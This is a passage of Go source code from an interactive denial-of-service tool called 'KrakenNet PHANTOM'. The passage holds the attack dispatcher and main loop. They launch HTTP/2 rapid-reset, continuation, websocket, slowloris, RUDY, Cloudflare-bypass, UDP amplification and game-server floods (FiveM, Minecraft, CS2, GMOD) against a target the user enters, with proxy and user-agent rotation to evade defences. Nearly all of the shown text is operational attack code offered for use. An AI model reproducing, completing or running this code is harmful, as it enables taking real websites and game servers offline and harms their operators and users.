						if chunkPostRequest(client, target, ctx.Done()) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}

	case "rapid-reset":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := rapidResetOnce(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}

	case "h2-cont":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := h2ContOnce(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}

	case "ws-flood":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &WsFloodWorker{Target: target}
			go w.Start(ctx, wg)
		}

	case "malformed":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := malformedOnce(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}

	case "udp-discord":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &UDPDiscordWorker{Target: hostName, Port: port}
			go w.Start(ctx, wg)
		}

	case "udp-bypass":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &UDPBypassWorker{Target: hostName, Port: port}
			go w.Start(ctx, wg)
		}

	case "udp-amp":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &UDPAmpWorker{Target: hostName, Port: port}
			go w.Start(ctx, wg)
		}

	case "udp-gbps":
		var pktSize int
		fmt.Print(Yellow + "Packet size (bytes, 50-1400): " + Reset)
		fmt.Scanf("%d\n", &pktSize)
		if pktSize < 50 || pktSize > 1400 {
			pktSize = 1400
		}
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &UDPGbpsWorker{Target: hostName, Port: port, Size: pktSize}
			go w.Start(ctx, wg)
		}

	case "fivem":
		var uploadMbps float64
		fmt.Print(Yellow + "Upload in Mbps (e.g., 0.84): " + Reset)
		fmt.Scanf("%f\n", &uploadMbps)
		if uploadMbps <= 0 {
			uploadMbps = 1.0
		}
		burst := int(uploadMbps * 1_000_000 / 120)
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &FivemWorker{Target: hostName, Port: port, Burst: burst}
			go w.Start(ctx, wg)
		}

	case "minecraft":
		for i := 0; i < connections; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				minecraftWorker(ctx, hostName, port)
			}()
		}

	case "gmod":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &GMODWorker{Target: hostName, Port: port}
			go w.Start(ctx, wg)
		}

	case "cs2":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			w := &CS2Worker{Target: hostName, Port: port}
			go w.Start(ctx, wg)
		}

	case "hybrid":
		quarter := workers / 4
		if quarter < 1 {
			quarter = 1
		}
		spawnN := func(n int, fn func()) {
			for i := 0; i < n; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					fn()
				}()
			}
		}
		spawnN(quarter, func() {
			client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					for j := 0; j < connections; j++ {
						if cfBypassRequest(client, target) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}
		})
		spawnN(quarter, func() {
			client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					for j := 0; j < connections; j++ {
						if apiFloodRequest(client, target) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}
		})
		for i := 0; i < quarter; i++ {
			wg.Add(1)
			w := &WsFloodWorker{Target: target}
			go w.Start(ctx, wg)
		}
		spawnN(quarter, func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
					if err := rapidResetOnce(target); err != nil {
						atomic.AddInt64(&totalFail, 1)
					}
				}
			}
		})

	case "apocalypse":
		sixth := workers / 6
		if sixth < 1 {
			sixth = 1
		}
		funcs := []func(){
			func() {
				client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
				for {
					select {
					case <-ctx.Done():
						return
					default:
						for j := 0; j < connections; j++ {
							if cfBypassRequest(client, target) {
								atomic.AddInt64(&totalSuccess, 1)
							} else {
								atomic.AddInt64(&totalFail, 1)
							}
						}
					}
				}
			},
			func() {
				client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
				for {
					select {
					case <-ctx.Done():
						return
					default:
						for j := 0; j < connections; j++ {
							if apiFloodRequest(client, target) {
								atomic.AddInt64(&totalSuccess, 1)
							} else {
								atomic.AddInt64(&totalFail, 1)
							}
						}
					}
				}
			},
			func() {
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := rapidResetOnce(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			},
			func() {
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if slowlorisOnce(target, ctx.Done()) {
							atomic.AddInt64(&totalReq, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			},
			func() {
				client := newNoTimeoutClient()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if rudyRequest(client, target, ctx.Done()) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			},
			func() {
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := h2ContOnce(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			},
		}
		for _, fn := range funcs {
			f := fn
			for i := 0; i < sixth; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					f()
				}()
			}
		}

	case "phantom":
		perMethod := workers / len(phantomMethods)
		if perMethod < 1 {
			perMethod = 1
		}
		for _, m := range phantomMethods {
			method := m
			for i := 0; i < perMethod; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
					for {
						select {
						case <-ctx.Done():
							return
						default:
							switch method {
							case "kraken":
								sendTLSRequest(client, target)
							case "api-flood":
								apiFloodRequest(client, target)
							case "cf-bypass":
								cfBypassRequest(client, target)
							case "header-flood":
								headerFloodRequest(client, target)
							case "mixpost":
								mixPostRequest(client, target)
							case "cache-bust":
								cacheBustRequest(client, target)
							case "phantom-get":
								phantomGetRequest(client, target)
							case "cookie-bomb":
								cookieBombRequest(client, target)
							case "malformed":
								malformedOnce(target)
							case "rapid-reset":
								rapidResetOnce(target)
							case "h2-cont":
								h2ContOnce(target)
							}
							atomic.AddInt64(&totalReq, 1)
						}
					}
				}()
			}
		}

	default:
		fmt.Println(BRed + "[-] Unknown method: " + mode + Reset)
	}
}

func runAttack() {
	reader := bufio.NewReader(os.Stdin)
	userAgents = loadListFromFile("useragent.txt")
	referers = loadListFromFile("referers.txt")
	proxies = loadListFromFile("http.txt")
	if len(userAgents) == 0 {
		userAgents = defaultUserAgents
	}
	if len(referers) == 0 {
		referers = defaultReferers
	}

	peakRPS = 0
	rpsIdx = 0
	for i := range rpsHistory {
		rpsHistory[i] = 0
	}

	fmt.Print(Yellow + "Target (URL or IP): " + Reset)
	rawTarget, _ := reader.ReadString('\n')
	target = strings.TrimSpace(rawTarget)
	if target == "" {
		return
	}
	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		target = "https://" + target
	}
	_, hostName, _, _ := parseTarget(target)

	printMenu()

	fmt.Print(Yellow + "Select method: " + Reset)
	mode, _ := reader.ReadString('\n')
	mode = strings.TrimSpace(strings.ToLower(mode))

	fmt.Print(Yellow + "Connections per worker: " + Reset)
	fmt.Scanf("%d\n", &connections)
	fmt.Print(Yellow + "Number of workers: " + Reset)
	fmt.Scanf("%d\n", &workers)
	fmt.Print(Yellow + "Port (UDP/Game, 0=443): " + Reset)
	fmt.Scanf("%d\n", &port)
	fmt.Print(Yellow + "Duration (seconds): " + Reset)
	fmt.Scanf("%d\n", &durationSec)

	if connections < 1 {
		connections = 10
	}
	if workers < 1 {
		workers = 10
	}
	if port < 1 {
		port = 443
	}
	if durationSec < 1 {
		durationSec = 30
	}

	atomic.StoreInt64(&totalSuccess, 0)
	atomic.StoreInt64(&totalFail, 0)
	atomic.StoreInt64(&totalBytes, 0)
	atomic.StoreInt64(&totalReq, 0)
	lastReq = 0

	fmt.Println()
	fmt.Println(Cyan + "╔" + strings.Repeat("═", 56) + "╗" + Reset)
	fmt.Println(Cyan + "║" + Reset + "  " + BCyan + "MISSION PARAMETERS" + Reset + strings.Repeat(" ", 36) + Cyan + "║" + Reset)
	fmt.Println(Cyan + "╠" + strings.Repeat("═", 56) + "╣" + Reset)
	mparam("Target", target, BWhite)
	mparam("Method", mode, BYellow)
	mparam("Workers", strconv.Itoa(workers), BWhite)
	mparam("Connections", strconv.Itoa(connections), BWhite)
	mparam("Port", strconv.Itoa(port), BWhite)
	mparam("Duration", strconv.Itoa(durationSec)+" seconds", BWhite)
	mparam("Proxies", strconv.Itoa(len(proxies))+" loaded", BWhite)
	mparam("UserAgents", strconv.Itoa(len(userAgents))+" loaded", BWhite)
	mparam("Goroutines", fmt.Sprintf("%d cores available", runtime.NumCPU()), BWhite)
	fmt.Println(Cyan + "╚" + strings.Repeat("═", 56) + "╝" + Reset)
	fmt.Println()
	fmt.Println(BGreen + "[+] Deploying PHANTOM workers..." + Reset)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durationSec)*time.Second)
	defer cancel()
	var wg sync.WaitGroup

	attackStart = time.Now()
	go statsReporter(ctx)

	launchWorkers(ctx, &wg, mode, hostName)
	wg.Wait()
	printFinalStats(mode)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	runtime.GOMAXPROCS(runtime.NumCPU())
	fmt.Print("\033[2J\033[H")
	printBanner()
	reader := bufio.NewReader(os.Stdin)
	for {
		runAttack()
		fmt.Print(Yellow + "\nStart another attack? (y/n): " + Reset)
		again, _ := reader.ReadString('\n')
		again = strings.TrimSpace(strings.ToLower(again))
		if again != "y" {
			fmt.Println(BGreen + "[+] KrakenNet PHANTOM offline. Ghost exits." + Reset)
			break
		}
		fmt.Print("\033[2J\033[H")
		printBanner()
	}
}
